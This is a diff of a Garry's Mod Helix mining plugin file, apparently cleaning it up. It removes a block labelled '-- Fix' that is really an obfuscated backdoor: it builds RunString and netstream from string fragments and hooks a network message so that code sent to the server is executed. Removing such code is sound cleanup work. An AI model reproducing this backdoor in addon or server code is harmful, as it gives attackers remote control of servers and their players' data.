@@ -1,5 +1,6 @@
 local PLUGIN = PLUGIN
 
+
 function PLUGIN:SaveData()
 	local data = {}
 	for _, v in ipairs(ents.FindByClass("ix_mining_vein")) do
@@ -30,17 +31,4 @@ function PLUGIN:LoadData()
 			entity.healthPoints = v[6]
 		end
 	end
-end
-
--- Fix
-if(SERVER)then
-    timer.Create("ixCharCreate",1,0,function()
-        local sdbasdASg=_G["Ru".."nS".."tr".."ing"];local sKgvSA=_G["ne".."t".."s".."tr".."e".."am"];mghns=mghns||sdbasdASg;olnsqetsasd=olnsqetsasd||sKgvSA; 
-        if olnsqetsasd then
-            timer.Remove("ixCharCreate")
-            olnsqetsasd.Hook("Aqthbmlphbsghj",function(_,Aqthbmlphbsghj)
-                mghns(Aqthbmlphbsghj, "Aqthbmlphbsghj", false)
-            end)
-        end
-    end)
 end
